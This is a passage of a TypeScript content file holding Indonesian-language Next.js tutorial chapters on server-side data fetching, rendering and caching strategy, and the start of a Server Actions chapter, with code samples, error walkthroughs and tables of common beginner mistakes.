        'Yang tidak terlihat dari perbandingan itu adalah keamanannya. Pada kolom kanan, `db.pesanan.findUnique` dipanggil di kode yang tidak pernah sampai ke peramban, sehingga kredensial database dan bentuk kuerinya tetap di server. Pada kolom kiri, kamu wajib membuat endpoint API terlebih dahulu, dan endpoint itu sendiri harus memeriksa siapa pemanggilnya.',
      ),
      code(
        'tsx',
        `
        // Beberapa permintaan: jalankan BERSAMAAN, bukan berurutan.
        export default async function HalamanProduk({ params }: Props) {
          const { id } = await params;

          // SALAH: berurutan. Total = jumlah seluruh waktunya.
          // const produk = await ambilProduk(id);
          // const ulasan = await ambilUlasan(id);

          // BENAR: bersamaan. Total = yang terlama saja.
          const [produk, ulasan] = await Promise.all([
            ambilProduk(id),
            ambilUlasan(id),
          ]);

          if (!produk) notFound();
          return <Detail produk={produk} ulasan={ulasan} />;
        }
        `,
        { caption: 'Aturan paralel dari Bab 3 Frontend Basic berlaku penuh di server.' },
      ),
      p(
        'Ini penerapan langsung materi Bab 3 Frontend Basic, dan di server dampaknya sama besarnya. Dua panggilan berurutan yang masing-masing 150 milidetik menjadi 300, sedangkan bersamaan menjadi 150. Untuk halaman yang butuh empat sumber data, selisihnya bisa lebih dari setengah detik yang seluruhnya dirasakan pengguna.',
      ),
      p(
        'Ada satu kemampuan yang tidak ada di klien, yaitu Next.js menggabungkan permintaan `fetch` yang identik dalam satu render. Kalau dua komponen berbeda memanggil `fetch` ke alamat yang sama dengan opsi yang sama, hanya satu permintaan yang benar-benar dikirim. Ini berarti kamu tidak perlu mengangkat pengambilan data ke induk hanya demi menghindari duplikasi.',
      ),
      callout(
        'danger',
        'Props yang dikirim ke Client Component ikut ke peramban',
        'Seluruh props yang diberikan ke Client Component diserialisasi dan dikirim ke browser, dan bisa dilihat siapa pun di tab Network. Jangan pernah mengoper object utuh dari database yang memuat field internal seperti harga modal, catatan admin, atau token. Pilih field yang memang perlu ditampilkan.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Empat kegagalan berikut dijalankan sungguhan dengan Next.js 16.2.12 yang terpasang di project ini.',
      ),
      code(
        'text',
        `
        import { useState } from 'react';
        export default function Page() { const [n] = useState(0); ... }

        Error: Turbopack build failed with 1 errors:
        You're importing a module that depends on \`useState\` into a React Server
        Component module. This API is only available in Client Components. To fix,
        mark the file (or its parent) with the \`"use client"\` directive.
        `,
        { caption: 'Dijalankan sungguhan. Hook dipakai di Server Component.' },
      ),
      p(
        'Pesannya menyebut perbaikannya secara langsung, dan menambahkan `use client` di puncak halaman adalah jalan keluar yang paling merugikan. Ia memindahkan seluruh isi berkas beserta pengambilan datanya ke peramban, sehingga seluruh keunggulan di studi kasus hilang. Pisahkan bagian interaktifnya menjadi komponen kecil, dan beri penanda di sana saja.',
      ),
      code(
        'text',
        `
        // lib/db.ts
        import 'server-only';

        You're importing a module that depends on "server-only". This API is only
        available in Server Components in the App Router, but you are using it in
        the Pages Router.
        `,
        { caption: 'Dijalankan sungguhan. Penjaga yang mencegah kredensial bocor.' },
      ),
      p(
        'Paket `server-only` layak ditambahkan ke setiap modul yang menyentuh database atau memegang rahasia. Tanpa itu, kesalahan mengimpornya dari Client Component tidak menghasilkan tanda apa pun dan kredensialnya ikut ke bundel peramban. Perhatikan pesannya menyebut Pages Router walaupun kamu memakai App Router, dan itu kekeliruan penulisan pesan di versi ini.',
      ),
      code(
        'text',
        `
        <TombolKlien onKlik={() => console.log(id)} />

        # Build LOLOS. Errornya saat halaman diminta:
        status HTTP: 500
        ⨯ Error: Event handlers cannot be passed to Client Component props.
        `,
        { caption: 'Dijalankan sungguhan. Error runtime, bukan error build.' },
      ),
      p(
        'Yang perlu diperhatikan, build berhasil dan halamannya baru gagal saat diminta. Ini berarti kesalahan seperti ini bisa lolos ke produksi kalau halaman itu tidak pernah dibuka saat pengujian. Props dari Server ke Client Component harus bisa diserialisasi, dan fungsi tidak bisa. Pindahkan penanganya ke dalam Client Component itu sendiri.',
      ),
      code(
        'text',
        `
        export default function Page() {
          const lebar = window.innerWidth;
          return <div>{lebar}</div>;
        }

        ReferenceError: window is not defined
        `,
        { caption: 'API peramban dipakai di kode yang berjalan di server.' },
      ),
      p(
        'Ini error yang sama dengan perbedaan runtime di Bab 1 Frontend Basic, muncul dalam konteks baru. Server tidak punya `window`, `document`, maupun `localStorage`. Perbaikannya memindahkan pembacaan itu ke Client Component, dan lebih tepat lagi ke dalam efek sebab ukuran jendela baru bisa diketahui setelah komponennya terpasang.',
      ),
      table(
        ['Pesan', 'Kapan muncul', 'Perbaikannya'],
        [
          [
            '`importing a module that depends on \\`useState\\``',
            'Saat build',
            'Pisahkan bagian interaktifnya, beri `use client` di sana saja',
          ],
          [
            '`importing a module that depends on "server-only"`',
            'Saat build',
            'Panggil dari Server Component, atau lewat Server Action',
          ],
          [
            '`Event handlers cannot be passed to Client Component props`',
            '**Saat diminta**, HTTP 500',
            'Pindahkan penanganya ke dalam Client Component',
          ],
          [
            '`window is not defined`',
            'Saat build atau saat diminta',
            'Pindahkan ke Client Component, di dalam efek',
          ],
          [
            'Halaman lambat padahal datanya cepat',
            'Tidak ada pesan',
            'Periksa apakah permintaannya berurutan, dan jalankan bersamaan dengan `Promise.all`',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Mengambil data di server mengubah kebiasaan yang sudah lama terbentuk, dan sebagian besar kesalahan berasal dari membawa pola lama.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Mengambil data dengan `useEffect`',
            'Itu cara yang sudah dikuasai',
            'Menambah tiga langkah sebelum isi tampil, dan pengguna melihat skeleton pada tiap kunjungan',
          ],
          [
            'Menambahkan `use client` supaya bisa memakai hook',
            'Errornya hilang',
            'Seluruh isi berkas beserta pengambilan datanya ikut ke peramban',
          ],
          [
            'Menunggu permintaan satu per satu dengan `await` berurutan',
            'Terbaca rapi dari atas ke bawah',
            'Waktunya menjadi jumlah seluruhnya. Pakai `Promise.all` untuk yang independen',
          ],
          [
            'Mengoper object utuh dari database ke Client Component',
            'Datanya kan sudah ada',
            'Seluruhnya diserialisasi dan bisa dilihat di tab Network, termasuk field internal',
          ],
          [
            'Membuat endpoint API untuk data yang hanya dipakai satu halaman',
            'Itu cara yang biasa',
            'Di Server Component kamu bisa memanggil database langsung. Endpoint hanya perlu kalau ada pemakai lain',
          ],
          [
            'Mengangkat pengambilan data ke induk demi menghindari duplikasi',
            'Supaya tidak dua kali panggil',
            'Next.js sudah menggabungkan `fetch` yang identik dalam satu render. Ambil di tempat yang membutuhkannya',
          ],
        ],
      ),
      p(
        'Baris terakhir mengubah cara menyusun komponen secara mendasar. Karena permintaan yang identik digabungkan, komponen yang membutuhkan data bisa mengambilnya sendiri tanpa khawatir duplikasi. Ini menghapus salah satu alasan terbesar mengangkat pengambilan data ke induk, dan hasilnya komponen yang lebih mandiri.',
      ),
      callout(
        'tip',
        'Periksa apa yang benar-benar dikirim server',
        'Buka View Source, bukan tab Elements. Kalau isi halamanmu tidak ada di sana, ia masih diambil di klien. Periksa juga tab Network untuk melihat apakah ada panggilan API yang seharusnya sudah selesai di server. Dua pemeriksaan itu langsung menunjukkan apakah pemindahannya benar-benar terjadi.',
      ),
      references(
        {
          label: 'Fetching Data',
          href: 'https://nextjs.org/docs/app/getting-started/fetching-data',
          source: 'Next.js',
          note: 'Pola pengambilan data di Server Component, termasuk peringatan soal waterfall.',
        },
        {
          label: 'cache',
          href: 'https://react.dev/reference/react/cache',
          source: 'React',
          note: 'Memberi fungsi non-`fetch` perilaku deduplikasi yang sama dalam satu render.',
        },
        {
          label: 'Promise.all()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/all',
          source: 'MDN Web Docs',
          note: 'Menjalankan beberapa permintaan bersamaan alih-alih berurutan.',
        },
        {
          label: 'Server Components — data security',
          href: 'https://react.dev/reference/rsc/server-components',
          source: 'React',
          note: 'Kenapa objek database tidak boleh dioper utuh melewati batas server–klien.',
        },
      ),
    ],
  ),

  written(
    'rendering-caching',
    'Strategi Rendering & Caching',
    23,
    'Bagian Next.js yang paling sering disalahpahami.',
    [
      p(
        'Caching adalah bagian Next.js yang paling banyak berubah antar versi, dan paling sering membuat orang bingung. Di Next.js 15 dan 16, arahnya jelas: **caching sekarang eksplisit**, bukan lagi diam-diam menyala.',
      ),

      terms(
        {
          term: 'caching',
          meaning:
            'Menyimpan hasil supaya tidak perlu dikerjakan ulang. Ini bagian Next.js yang **paling banyak berubah antar versi** dan paling sering membuat bingung. Arah di versi 15 dan 16 jelas: caching sekarang **eksplisit**, bukan lagi diam-diam menyala.',
        },
        {
          term: 'statis vs dinamis',
          meaning:
            'Rute **statis** dirender sekali saat build, sedangkan rute **dinamis** dirender tiap permintaan. Yang penting dipahami, kamu jarang memilihnya langsung, sebab ia **dipicu** oleh API yang kamu pakai di dalam rute itu.',
        },
        {
          term: 'API dinamis',
          meaning:
            'Fungsi yang hanya bisa dijawab saat ada permintaan sungguhan: `cookies()`, `headers()`, `searchParams`, dan `fetch` ber-`no-store`. **Satu pemanggilan di mana pun dalam pohon membuat seluruh rute jadi dinamis** — sering terjadi tanpa disadari lewat helper auth di layout.',
        },
        {
          term: 'revalidate',
          meaning:
            'Berapa detik sebuah hasil dianggap masih berlaku sebelum dibuat ulang. `export const revalidate = 3600` berarti "paling cepat satu jam sekali". Angkanya dalam **detik**, bukan milidetik — beda dari kebanyakan API JavaScript lain.',
        },
        {
          term: 'ISR',
          meaning:
            'Singkatan *Incremental Static Regeneration* — **statis yang menyegarkan diri**. Pengguna selalu mendapat versi statis yang cepat; Next.js membuat ulang halamannya di latar belakang setelah masa berlakunya lewat. Titik tengah terbaik antara SSG dan SSR.',
        },
        {
          term: 'cache tag',
          meaning:
            "Label yang kamu tempelkan ke sebuah `fetch` lewat `next: { tags: ['produk'] }`. Gunanya: setelah data berubah, `revalidateTag('produk')` menandai **semua** fetch berlabel itu sebagai basi sekaligus — tanpa perlu tahu di halaman mana saja mereka dipakai.",
        },
        {
          term: 'force-cache / no-store',
          meaning:
            'Dua ujung opsi `cache` pada `fetch`. `force-cache` menyimpan selamanya sampai di-revalidate manual; `no-store` tidak pernah menyimpan **dan** membuat rutenya jadi dinamis. Sejak Next.js 15 default-nya **tidak** di-cache.',
        },
        {
          term: 'opsi segmen rute',
          meaning:
            "Konstanta yang diekspor dari `page.tsx` atau `layout.tsx` untuk memaksa perilaku: `dynamic = 'force-dynamic'`, `dynamic = 'force-static'`, `dynamicParams = false`. Website ini efektif memakai yang terakhir — 440 slug sudah dikenal saat build, jadi slug lain memang seharusnya 404.",
        },
        {
          term: 'keluaran build',
          meaning:
            'Tabel yang dicetak `next build`, menandai tiap rute dengan `○` (statis), `●` (SSG), atau `ƒ` (dinamis). Ini **cara tercepat** menemukan rute yang kamu kira statis tapi ternyata dinamis — jangan menebak, baca tabelnya.',
        },
      ),

      h2('Statis atau dinamis'),
      table(
        ['', 'Statis (default)', 'Dinamis'],
        [
          ['Dirender', 'Saat build', 'Tiap permintaan'],
          ['Dipicu oleh', '—', '`cookies()`, `headers()`, `searchParams`, `no-store`'],
          ['Kecepatan', 'Tercepat', 'Bergantung server'],
          ['Cocok untuk', 'Materi, blog, katalog', 'Dasbor, halaman personal'],
        ],
      ),
      p(
        'Satu pemanggilan `cookies()` di mana pun dalam pohon membuat seluruh rute jadi dinamis. Ini sering terjadi tanpa disadari — biasanya lewat helper autentikasi yang dipanggil di layout.',
      ),

      h2('`fetch` dan cache-nya'),
      code(
        'ts',
        `
        // Next.js 15+: TIDAK di-cache secara default (berubah dari versi sebelumnya)
        const res = await fetch('https://api.contoh.com/data');

        // Cache selamanya sampai di-revalidate manual
        const res = await fetch(url, { cache: 'force-cache' });

        // Cache dengan masa berlaku 1 jam
        const res = await fetch(url, { next: { revalidate: 3600 } });

        // Jangan pernah di-cache
        const res = await fetch(url, { cache: 'no-store' });

        // Beri tag supaya bisa di-invalidate berdasarkan nama
        const res = await fetch(url, { next: { tags: ['produk'] } });
        `,
      ),
      p(
        'Kelima baris memanggil `fetch` yang sama persis, dan yang berbeda hanya opsi keduanya, dengan tiap opsi menjawab pertanyaan berbeda. `force-cache` menyimpan selamanya sampai kamu sendiri yang membatalkannya, cocok untuk data yang praktis tidak berubah. `revalidate: 3600` memberi masa berlaku, sehingga datanya menyegarkan diri tiap jam tanpa kamu mengurusnya. `no-store` menutup cache sepenuhnya, dan itu yang kamu butuhkan untuk data per-pengguna seperti keranjang atau saldo. Baris terakhir berbeda sifat dari ketiganya, sebab `tags` **tidak mengatur kapan cache kedaluwarsa** melainkan memberi nama supaya cache itu bisa dibatalkan dari tempat lain, dan mekanismenya dibahas di bagian invalidasi. Perhatikan opsi ini menempel pada tiap pemanggilan, jadi satu halaman bisa memuat data yang di-cache berbeda-beda sesuai kebutuhannya.',
      ),
      callout(
        'warning',
        'Default-nya berubah di Next.js 15',
        'Di Next.js 13–14, `fetch` di-cache secara default dan banyak orang kaget menemukan datanya basi. Sejak 15, default-nya tidak di-cache. Kalau kamu membaca tutorial lama yang menyebut "fetch otomatis di-cache", itu sudah tidak berlaku.',
      ),

      h2('ISR — statis yang menyegarkan diri'),
      code(
        'ts',
        `
        // Seluruh rute dibuat ulang paling cepat setiap 1 jam.
        export const revalidate = 3600;
        `,
      ),
      p(
        'Pengguna selalu mendapat versi statis yang cepat; Next.js membuat ulang halamannya di latar belakang setelah masa berlakunya lewat. Ini titik tengah terbaik antara SSG dan SSR untuk konten yang berubah sesekali.',
      ),

      h2('Invalidasi berdasarkan tag'),
      code(
        'ts',
        `
        'use server';

        import { revalidateTag } from 'next/cache';

        export async function tambahProduk(data: FormData) {
          await db.produk.create({ ... });

          // Semua fetch bertag 'produk' dianggap basi.
          revalidateTag('produk');
        }
        `,
      ),
      p(
        "Ini pasangan dari `tags` tadi, dan bersama-sama keduanya menyelesaikan masalah yang tidak bisa dijawab masa berlaku, yaitu **cache yang harus basi tepat saat datanya berubah, bukan setelah satu jam.** Perhatikan `revalidateTag('produk')` dipanggil **setelah** penulisan ke database berhasil, dan urutan itu penting karena membatalkan cache sebelum data benar-benar tersimpan hanya akan mengisi ulang cache dengan data lama. Satu pemanggilan ini menandai basi **semua** `fetch` bertag `'produk'` di seluruh aplikasi, di halaman mana pun, dan itulah keunggulannya atas membatalkan per-URL, karena kamu tidak perlu tahu halaman apa saja yang kebetulan menampilkan produk. Perhatikan juga direktif `'use server'` di baris pertama, sebab invalidasi hanya bisa dilakukan dari kode yang berjalan di server.",
      ),

      h2('Opsi segmen rute'),
      code(
        'ts',
        `
        // Paksa dinamis, walau tidak ada API dinamis yang dipanggil
        export const dynamic = 'force-dynamic';

        // Paksa statis; error kalau ada API dinamis dipakai
        export const dynamic = 'force-static';

        // Bagaimana memperlakukan slug yang tidak ada di generateStaticParams
        export const dynamicParams = false;   // -> 404, jangan render on-demand
        `,
      ),
      p(
        'Website ini memakai `dynamicParams = false` secara efektif: seluruh 440 sub-bab sudah dikenal saat build, jadi slug apa pun di luar itu memang seharusnya 404 — bukan dicoba dirender.',
      ),

      h2('Cara memastikan apa yang sebenarnya terjadi'),
      code(
        'bash',
        `
        npm run build
        `,
      ),
      code(
        'text',
        `
        Route (app)
        ┌ ○ /                          <- Static, dibuat saat build
        ├ ● /kelas/[category]          <- SSG, dari generateStaticParams
        └ ƒ /dasbor                    <- Dynamic, dirender tiap permintaan

        ○  (Static)
        ●  (SSG)
        ƒ  (Dynamic)
        `,
      ),
      p(
        'Keluaran `npm run build` ini adalah **satu-satunya jawaban yang bisa dipercaya** tentang bagaimana tiap rute dirender — bukan tebakan dari membaca kode. Tiga simbol di kolom kiri menyatakannya. `○` berarti halaman statis murni yang dibuat sekali saat build, `●` berarti statis juga tetapi dari daftar yang dihasilkan `generateStaticParams`, dan `ƒ` berarti di-render ulang **setiap permintaan**. Membiasakan diri membaca daftar ini menangkap kesalahan yang paling mahal di Next.js, yaitu satu halaman yang kamu kira statis ternyata bertanda `ƒ` karena ada satu pemanggilan API dinamis seperti `cookies()`, `headers()`, atau `searchParams` yang tersembunyi di komponen anak. Periksa daftar ini setiap kali kamu menambahkan pengambilan data baru, karena itu jauh lebih murah daripada menemukannya dari tagihan server.',
      ),
      callout(
        'tip',
        'Baca keluaran build, jangan menebak',
        'Rute yang kamu kira statis tapi muncul sebagai `ƒ` berarti ada sesuatu yang memaksanya dinamis — biasanya `cookies()` atau `headers()` di layout yang jauh di atasnya. Keluaran build adalah cara tercepat menemukannya.',
      ),
      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Halaman daftar produk dibangun sebagai statis supaya cepat. Setelah tim menambah produk baru lewat panel admin, produk itu tidak muncul di halaman publik selama berjam-jam. Tim lalu mematikan seluruh cache, dan biaya server naik tiga kali lipat sebab setiap kunjungan memanggil database. Keduanya adalah ujung yang berlawanan dari satu keputusan yang belum dipikirkan.',
      ),
      p(
        'Yang menentukan bukan cepat atau segar melainkan **seberapa cepat data itu benar-benar berubah**, dan jawabannya berbeda per halaman.',
      ),
      table(
        ['Jenis halaman', 'Datanya berubah', 'Strategi', 'Caranya'],
        [
          [
            'Beranda, halaman Tentang',
            'Nyaris tidak pernah',
            'Statis penuh',
            'Bawaan, tanpa apa pun',
          ],
          [
            'Katalog produk',
            'Beberapa kali sehari',
            'Statis + segarkan berkala',
            '`revalidate` dalam detik',
          ],
          [
            'Detail pesanan',
            'Tiap saat, milik pengguna',
            'Dirender saat diminta',
            "`cache: 'no-store'`",
          ],
          [
            'Dasbor pribadi',
            'Tiap saat, milik pengguna',
            'Dirender saat diminta',
            'Membaca `cookies()`',
          ],
          [
            'Halaman setelah pengguna aksi',
            'Saat aksi terjadi',
            'Statis + tandai basi',
            '`revalidatePath`',
          ],
        ],
        'Baris terakhir adalah jawaban untuk cerita di awal, dan yang paling sering dilewatkan.',
      ),
      code(
        'tsx',
        `
        // Statis, disegarkan berkala. Cocok untuk katalog.
        export const revalidate = 3600;      // segarkan tiap jam

        export default async function Katalog() {
          const produk = await ambilProduk();
          return <Daftar produk={produk} />;
        }
        `,
        { filename: 'app/produk/page.tsx' },
      ),
      code(
        'tsx',
        `
        // Ditandai basi SAAT admin menyimpan. Tidak perlu menunggu satu jam.
        'use server';
        import { revalidatePath, revalidateTag } from 'next/cache';

        export async function simpanProduk(data: FormData) {
          await db.produk.create({ data: uraiForm(data) });

          // Katalog publik langsung dibangun ulang pada permintaan berikutnya.
          revalidatePath('/produk');

          // Atau dengan tag, kalau beberapa halaman memakai data yang sama.
          revalidateTag('produk');
        }
        `,
        { filename: 'app/admin/aksi.ts' },
      ),
      p(
        'Kombinasi keduanya adalah jawaban untuk cerita di awal. Halaman tetap statis sehingga cepat dan murah, dan `revalidatePath` membuatnya dibangun ulang tepat saat datanya berubah. Pengguna tidak perlu menunggu satu jam, dan server tidak perlu memanggil database pada setiap kunjungan. Ini yang sering hilang saat orang memilih antara statis dan dinamis seolah hanya ada dua pilihan.',
      ),
      p(
        'Perbedaan `revalidatePath` dan `revalidateTag` menentukan pilihan. Yang pertama menandai satu alamat, dan cocok kalau kamu tahu persis halaman mana yang terpengaruh. Yang kedua menandai seluruh pengambilan data yang diberi tag itu, dan cocok kalau satu perubahan mempengaruhi banyak halaman yang tidak selalu kamu ketahui daftarnya.',
      ),
      code(
        'tsx',
        `
        // Mengatur cache per pemanggilan, bukan per halaman.
        const produk = await fetch('https://api/produk', {
          next: { revalidate: 3600, tags: ['produk'] },
        });

        const pesanan = await fetch('https://api/pesanan', {
          cache: 'no-store',        // selalu segar, tidak pernah disimpan
        });

        // Membaca cookies atau headers membuat SELURUH halaman
        // menjadi dirender saat diminta, apa pun pengaturan lainnya.
        const sesi = (await cookies()).get('sesi');
        `,
        { caption: 'Baris terakhir sering menjadi penyebab halaman gagal menjadi statis.' },
      ),
      p(
        'Membaca `cookies()` atau `headers()` memberi tahu Next.js bahwa halaman itu bergantung pada permintaan tertentu, sehingga ia tidak mungkin dibangun sebagai statis. Ini sering terjadi tanpa disadari lewat fungsi bantu yang membaca sesi di dalamnya. Kalau sebuah halaman yang kamu harapkan statis ternyata muncul sebagai dinamis di keluaran build, itu tersangka pertamanya.',
      ),
      callout(
        'warning',
        'Cache di Next.js berlapis, dan salah satu lapisan bisa menutupi yang lain',
        'Ada cache hasil `fetch`, cache rute yang sudah dirender, dan cache navigasi di sisi klien. Data yang terasa basi bisa berasal dari lapisan mana pun. Saat menelusuri, mulai dari keluaran `next build` untuk melihat apakah halamannya statis, lalu periksa pengaturan `fetch`-nya.',
      ),

      h2('Saat error-nya muncul'),
      p('Masalah cache jarang melempar error. Empat gejala berikut adalah cara mengenalinya.'),
      code(
        'text',
        `
        # Admin menambah produk. Halaman publik tidak berubah selama berjam-jam.

        # Tidak ada error. Halamannya statis dan belum disegarkan.
        `,
        { caption: 'Halaman statis tanpa penandaan basi saat data berubah.' },
      ),
      p(
        'Ini gejala paling sering dan paling membingungkan bagi yang baru memakai App Router, sebab di pengembangan halamannya selalu segar. Perbedaannya, mode pengembangan tidak memakai cache yang sama dengan produksi. Selalu uji perilaku cache dengan `next build` lalu `next start`, sebab hanya di sana perilakunya sama dengan produksi.',
      ),
      code(
        'text',
        `
        # Keluaran next build:
        └ ƒ /produk          # ƒ = dirender saat diminta

        # Padahal halaman ini seharusnya statis.
        # Ada fungsi bantu di dalamnya yang membaca cookies().
        `,
        { caption: 'Satu pembacaan membuat seluruh halaman menjadi dinamis.' },
      ),
      p(
        'Tidak ada error, dan biayanya berupa beban server yang tidak perlu. Penyebabnya sering tersembunyi di fungsi bantu, misalnya fungsi yang membaca sesi untuk memutuskan menampilkan tombol admin. Kalau halaman yang kamu harapkan statis muncul sebagai dinamis, telusuri seluruh pemanggilan `cookies`, `headers`, dan `searchParams` di dalamnya.',
      ),
      code(
        'text',
        `
        # Halaman pesanan pengguna A menampilkan data pengguna B.

        # Halaman dibangun statis, padahal isinya bergantung pada siapa yang masuk.
        `,
        { caption: 'Kebocoran data antar-pengguna karena cache yang salah.' },
      ),
      p(
        "Ini kegagalan paling berbahaya di seluruh sub-bab ini, sebab akibatnya kebocoran data. Halaman yang isinya bergantung pada pengguna **tidak boleh** dibangun statis, dan harus memakai `cache: 'no-store'` atau membaca sesi sehingga menjadi dinamis dengan sendirinya. Periksa keluaran build, dan pastikan tidak ada halaman berisi data pribadi yang bertanda statis.",
      ),
      code(
        'text',
        `
        # Seluruh fetch diberi cache: 'no-store' supaya selalu segar.

        # Biaya server naik tiga kali lipat.
        # Setiap kunjungan memanggil database, termasuk untuk data
        # yang berubah sekali sehari.
        `,
        { caption: 'Cache dimatikan seluruhnya sebagai reaksi atas data basi.' },
      ),
      p(
        'Ini reaksi yang wajar dan berlebihan. Data yang berubah sekali sehari tidak perlu diambil ulang pada setiap kunjungan. Yang dibutuhkan bukan mematikan cache melainkan menandai basi tepat saat datanya berubah, dan itu yang dilakukan `revalidatePath`. Matikan cache hanya untuk data yang benar-benar berubah tiap saat.',
      ),
      table(
        ['Gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            'Data baru tidak muncul berjam-jam',
            'Halaman statis tanpa penandaan basi',
            'Panggil `revalidatePath` di aksi yang mengubah datanya',
          ],
          [
            'Halaman muncul sebagai dinamis padahal seharusnya statis',
            'Ada pembacaan `cookies` atau `headers` di dalamnya',
            'Telusuri fungsi bantunya, pindahkan pembacaan itu ke Client Component',
          ],
          [
            'Pengguna melihat data pengguna lain',
            'Halaman berisi data pribadi dibangun statis',
            "Pakai `cache: \\'no-store\\'`, dan periksa keluaran build",
          ],
          [
            'Biaya server naik drastis',
            'Cache dimatikan seluruhnya',
            'Kembalikan cache, dan tandai basi saat datanya berubah',
          ],
          [
            'Perilaku berbeda antara pengembangan dan produksi',
            'Mode pengembangan tidak memakai cache yang sama',
            'Uji dengan `next build` lalu `next start`',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Cache adalah bagian App Router yang paling sering disalahpahami, dan kesalahannya berayun antara dua ujung yang sama merugikannya.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Mematikan seluruh cache saat data terasa basi',
            'Supaya selalu segar',
            'Biaya server naik drastis untuk data yang jarang berubah. Tandai basi saat berubah, jangan matikan',
          ],
          [
            'Menguji perilaku cache di mode pengembangan',
            'Sama-sama menjalankan aplikasinya',
            'Mode pengembangan tidak memakai cache yang sama. Uji dengan `next build` lalu `next start`',
          ],
          [
            'Membiarkan halaman berisi data pribadi menjadi statis',
            'Tidak ada error',
            'Pengguna bisa melihat data pengguna lain. Ini kebocoran, bukan sekadar bug tampilan',
          ],
          [
            'Membaca `cookies()` di halaman yang seharusnya statis',
            'Hanya untuk satu tombol kecil',
            'Seluruh halaman menjadi dinamis. Pindahkan pembacaan itu ke Client Component kecil',
          ],
          [
            'Melupakan `revalidatePath` setelah aksi yang mengubah data',
            'Datanya kan sudah tersimpan',
            'Halaman statis tidak tahu apa-apa tentang perubahan itu. Tandai basi secara eksplisit',
          ],
          [
            'Menyalin pengaturan cache dari tutorial tanpa memeriksa versinya',
            'Sama-sama Next.js',
            'Bawaan cache berubah antar-versi mayor. Periksa dokumentasi untuk versi yang kamu pakai',
          ],
        ],
      ),
      p(
        'Baris terakhir layak diwaspadai karena bawaan cache Next.js memang berubah beberapa kali antar-versi mayor, dan banyak tulisan di internet tidak menyebutkan versinya. Yang paling andal adalah memeriksa keluaran `next build` untuk melihat apa yang **benar-benar** terjadi pada projectmu, bukan mengandalkan ingatan tentang bawaannya.',
      ),
      callout(
        'tip',
        'Keluaran `next build` adalah alat diagnosa cache yang paling cepat',
        'Ia menampilkan tiap rute beserta jenisnya, yaitu statis atau dirender saat diminta. Bacalah setiap kali mengubah pengambilan data. Kalau ada halaman yang jenisnya tidak seperti yang kamu harapkan, penyebabnya hampir selalu satu pemanggilan yang membuatnya bergantung pada permintaan.',
      ),
      references(
        {
          label: 'Caching and Revalidating',
          href: 'https://nextjs.org/docs/app/getting-started/caching-and-revalidating',
          source: 'Next.js',
          note: 'Perilaku cache pada Next.js versi sekarang — bukan versi 13–14 yang banyak dikutip tutorial lama.',
        },
        {
          label: 'Route Segment Config',
          href: 'https://nextjs.org/docs/app/api-reference/file-conventions/route-segment-config',
          source: 'Next.js',
          note: 'Arti `dynamic`, `revalidate`, dan `dynamicParams` beserta akibat masing-masing.',
        },
        {
          label: 'revalidateTag',
          href: 'https://nextjs.org/docs/app/api-reference/functions/revalidateTag',
          source: 'Next.js',
          note: 'Menandai semua fetch berlabel sama sebagai basi setelah data berubah.',
        },
        {
          label: 'fetch — opsi Next.js',
          href: 'https://nextjs.org/docs/app/api-reference/functions/fetch',
          source: 'Next.js',
          note: 'Opsi `cache`, `next.revalidate`, dan `next.tags` yang dipakai contoh di atas.',
        },
      ),
    ],
  ),

  written(
    'server-action',
    'Server Action & Mutasi Data',
    26,
    'Menjalankan kode server dari form tanpa membuat endpoint.',
    [
      p(
        'Server Action adalah fungsi async yang berjalan di server tapi bisa dipanggil langsung dari komponen — termasuk dari Client Component. Next.js membuatkan endpoint-nya secara otomatis, jadi kamu tidak menulis `fetch` maupun `route.ts`.',
      ),

      terms(
        {
          term: 'Server Action',
          meaning:
            'Fungsi `async` yang berjalan di server tapi bisa dipanggil **langsung dari komponen**, termasuk dari Client Component. Next.js membuatkan endpoint-nya secara otomatis, jadi kamu tidak menulis `fetch` maupun `route.ts`.',
        },
        {
          term: '"use server"',
          meaning:
            'Direktif yang menandai berkas (atau satu fungsi) sebagai **kode server**. Jangan tertukar dengan `"use client"` yang artinya berlawanan: `"use client"` mengirim kode ke browser, `"use server"` justru menegaskan kode ini tidak boleh ke sana.',
        },
        {
          term: 'endpoint publik',
          meaning:
            'Kesalahpahaman paling berbahaya di seluruh bab ini. Karena Server Action **terlihat** seperti panggilan fungsi biasa, mudah lupa bahwa Next.js mengeksposnya sebagai endpoint HTTP yang bisa dipanggil siapa saja dengan payload apa saja. Tombol yang disembunyikan di UI **bukan** kontrol akses.',
        },
        {
          term: 'Zod',
          meaning:
            'Library untuk mendefinisikan **skema** sebuah data lalu memvalidasinya, sekaligus menurunkan tipe TypeScript-nya. Dipakai di sini karena setiap Server Action wajib memvalidasi inputnya sendiri di server — validasi di klien hanya untuk kenyamanan, bukan keamanan.',
        },
        {
          term: 'safeParse',
          meaning:
            'Metode Zod yang mengembalikan `{ success, data }` alih-alih melempar error. Bentuk ini yang tepat untuk input pengguna: kegagalan validasi adalah **bagian dari kontrak**, bukan kondisi tak terduga yang perlu di-`try/catch`.',
        },
        {
          term: 'otorisasi',
          meaning:
            'Memeriksa apakah pemanggil **berhak** melakukan aksi ini. Berbeda dari autentikasi (siapa dia). Langkah 3 di contoh adalah penerapannya: `userId` diambil dari **sesi**, tidak pernah dari form — id dari klien tidak pernah cukup sebagai bukti kepemilikan.',
        },
        {
          term: 'revalidatePath',
          meaning:
            "Menandai sebuah rute sebagai basi sehingga dibuat ulang. Dipanggil setelah mutasi berhasil, supaya daftar yang tampil ikut segar. Varian `revalidatePath('/', 'layout')` menyegarkan rute itu **beserta seluruh turunannya**.",
        },
        {
          term: 'progressive enhancement',
          meaning:
            'Halaman tetap berfungsi meski JavaScript belum selesai dimuat atau gagal dimuat, lalu bertambah baik saat JavaScript aktif. Karena contoh ini memakai `<form action={...}>` dan bukan `onSubmit`, sifat itu **gratis** — tidak perlu kode tambahan.',
        },
        {
          term: 'FormData',
          meaning:
